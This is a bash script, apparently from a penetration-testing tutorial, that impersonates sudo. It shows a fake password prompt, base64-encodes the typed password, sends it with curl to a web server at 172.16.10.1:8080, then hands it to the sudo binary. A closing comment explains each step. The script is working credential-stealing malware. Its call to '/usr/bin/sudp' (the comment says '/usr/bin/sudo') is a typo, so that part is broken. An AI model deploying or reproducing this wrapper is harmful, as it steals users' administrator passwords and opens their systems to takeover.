#!/bin/bash
ARGS="$@"


leak_over_http() {
    encoded_password=$(echo "${1}" | base64 | sed s'/[=+/]//'g)
    curl -m 5 -s -o /dev/null "http://172.16.10.1:8080/${encoded_password}"
}


stty -echo
read -r -p "[sudo] password for $(whoami): " sudopassw


leak_over_http "${sudopassw}"
stty echo
echo "${sudopassw}" | /usr/bin/sudp -p "" -S -K ${ARGS}


# We turn off input echoing by using stty -echo.
# We then read input from the user and present a sudo-like prompt.
# As the input is the user's password, it shouldn't be presented
# in cleartext to the user while they're typing it. This is
# because, by default, sudo hides the input while it's being type,
# and we need to emulate the look and feel of the origianl command.
# So, we disable input echoing before accepting input from the user.
# Next, we leak the provided password by using the
# leak_over_http() function. This function will use base64 to encode
# the password and use curl to make an HTTP GET request to a path
# on the web server, using the captured password as the path.
# We turn on input echoing and pass the password, along with the
# command the user executed, to the real sudo binary (/usr/bin/sudo)
# so that the sudo execution resumes normally.
